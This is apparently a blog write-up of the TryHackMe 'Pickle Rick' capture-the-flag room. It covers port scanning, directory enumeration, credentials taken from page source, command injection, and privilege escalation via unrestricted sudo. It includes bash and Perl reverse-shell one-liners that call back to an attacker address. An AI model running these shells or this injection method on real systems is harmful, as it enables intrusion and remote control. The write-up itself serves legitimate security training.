---
layout: post
title: Pickle Rick Writeup
categories: [TryHackMe]
tags: [Command Injection, Web shell, Directory Enumeration, Dirsearch]
---

# Pickle Rick Walkthrough.
This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.
Check it out here: [TryHackMe](https://www.tryhackme.com/room/picklerick)

# ~$ Preface
  Hey there, I'll be honest this was the first time I used a web shell lol and it was indeed much fun, I'll walk you through how I went about it XD, funfact Rick&Morty has been my go-to fav cartoon since 2015,  eyepatch morty is my buddy and I genuinely have a deep seated hatred for Jerry and his insipidity ;) but as always I'll be leaving hints before I drop the spoilers, and by spoilers I mean the answers lol just kidding you won't find glaring answers here buddy hehee
  ![image](https://images6.alphacoders.com/876/thumb-1920-876893.jpg)
  
# ~$ Hints 
- source page
- command injection?
- web shells
- directory enumeration
- extensions.

A'ight so as always, a port scan first::
```
┌──(azazel㉿azazel)-[~/Tryhackme/PickleRick]
└─$ nmap -sC -sV 10.10.220.220 -Pn -vv -p 1-1024 -T4 -o nmap
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 18:18 WAT
NSE: Loaded 155 scripts for scanning.
Initiating Connect Scan at 18:18
Scanning 10.10.220.220 [1024 ports]
Discovered open port 80/tcp on 10.10.220.220
Not shown: 1022 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 21:86:91:05:1b:b6:3c:1a:91:a3:6b:a6:fe:a3:28:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOejy/mcAGAdwTSazZu0TOhmJzXnVoAlpDkpPFEnxBppNiIDf11gJkgAz/kNJ/Xzpy5/r4EcBm5VlyD1OHbgp4BB7/+XmWFLIiombdwcGEYrnXJ86DdY8JPu4enMn85mhi2eI8/QwHk5PmaIBufGk6YAdrAunR2T3UfZriuJB4MXQw4ElicxJ+EEuaaMirwhVx8p9i1HqC2c5U95N22y/CBDETIgGZHkZQkMC2HpHREbcs7tTPQdPbv9TSL7Ie0Tvdi6LFAMx2zZmfBprnAUT6DsNvRmu5uyGisQpw4STgwjPVJ/BJInFEHPS25Afv/2BVMfhX3af6yJQA4QPuBKJF
|   256 91:18:52:30:3e:b6:e0:29:0d:72:91:17:b7:64:05:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEehoL4UxfT2BMPVEAxmPHcDhmZhmzE1AD2zqGHtqgDLkdjKE3xMgqVle5l3DNb6D/44/pTyklMJWmPTTY9t8S0=
|   256 d2:1b:90:6d:32:2f:cb:0e:64:af:61:e7:60:34:95:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcg2XsRFJ0X32sAAhVOLEn/LubUccaCEVVDQV6slCHD
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:18
Completed NSE at 18:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:18
Completed NSE at 18:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:18
Completed NSE at 18:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.34 seconds
```
Okay, just ssh and http hmph...

Straight up, I visited the site::
![image](/assets/img/posts/Rick&Morty/r&mLanding.png)

Found nothing but a message from rick in dire need of our help to revert back to human... Quickly I view the page source, always view the source! therein I find this commented out:
```
    Note to self, remember username!

    Username: R1ckRul3s   
 ```
 
 Okay Classic rick keeping hidden reminders for himself, I try the username on port 22 and bruteforce the creds with hydra and realized it could only be 2 things: apparently Rick's pass isn't in a wordlist OR the acquired username is not for ssh, while hydra was still trying I resort to my go-to dir enum tool, Dirsearch:)
fire her up and get these hidden directories:
 
 ```
 ┌──(azazel㉿azazel)-[~/Tryhackme/PickleRick]
└─$ dirsearch -u 10.10.220.220 -w /usr/share/wordlists/dirb/common.txt -t 30

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/azazel/.dirsearch/reports/10.10.220.220_22-04-11_18-52-02.txt

Error Log: /home/azazel/.dirsearch/logs/errors-22-04-11_18-52-02.log

Target: http://10.10.220.220/

[18:52:10] Starting: 
[18:52:19] 301 -  315B  - /assets  ->  http://10.10.220.220/assets/
[18:52:34] 200 -   1KB - /index.html
[18:52:40] 200 -  882B  - /login.php
[18:52:48] 200 -   17B  - /robots.txt
[18:52:50] 403 -  301B  - /server-status

Task Completed
                                        
```
 Nothing much only interesting directory is a login page and the robots.txt, checked that out to see any pages disallowed to be crawled and Instead see Rick's catch phrase
 
 ```
 
 Wub############ub
 
 ```
  ![image](https://media2.giphy.com/media/l41lI4bYmcsPJX9Go/giphy.gif?cid=790b76115528c812b615af1876ff62340969d6ac03f0e5bc&rid=giphy.gif&ct=g)
 
 Welp, we have a username and possibly a pass, but goes where exactly? Found a login page and try the creds there:
 
 ![image](/assets/img/posts/Rick&Morty/rick&mortyloginpage.png)
 
 And then we're greeted with an input field which accepts commands--Command Injection took advantage of this and tried to find and read all the ingredients but there is some sort of input filter that prevents us from reading files with cat, tail, head but not less and find lmao! all of what we need, hehee:
 ![image](/assets/img/posts/Rick&Morty/rick&mortyinputfilter.png)
 
 I could grab all the ingredients through this method but that's no fun! and it also felt somewhat restrictive and defeats the initial access idea.
 Now to upload a shell!

 ![iamge](/assets/img/posts/Rick&Morty/rick&mortydirlis.png)
 
 A classic Bash one liner would work::
```
bash -c >& /dev/tcp/ip/8888 0>&1
```
but I felt like exploring other shell one liners out of curiousity I resorted to trying out Perl, grabbed a Reverse shell one liner from [PentestMonkey](https://pentestmonkey.net/):

```
perl -e 'use Socket;$i="10.8.45.27";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```
NB:: Adjust the parameters to receive the shell, you wouldn't to be sending me a shell, would you now?
 
We're in! and now to comfortably read the Sup3rS3cretPickl3Ingred.txt file

```
www-data@ip-10-10-60-92:/var/backups$ cat Sup3rS3cretPickl3Ingred.txt
mr. ###### hair
```
Found the second ingredient in Rick's Home directory::
```
www-data@ip-10-10-60-92:/home/rick$ cat second\ ingredients
1 #### tear
```

And as compensation and horrible security, the www-data user who we are logged in as has sudo permissions to execute EVERYTHING? sheesh!

```
Matching Defaults entries for www-data on ip-10-10-60-92.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on ip-10-10-60-92.eu-west-1.compute.internal:
    (ALL : ALL) ALL
```

To make ourselves root and grab the last ingredient::

```
www-data@ip-10-10-60-92:/home/rick$ sudo su
root@ip-10-10-60-92: cd /root; cat 3rd.txt
```
And that's it! We saved Rick and got to see jerry tears too --the joy:-)
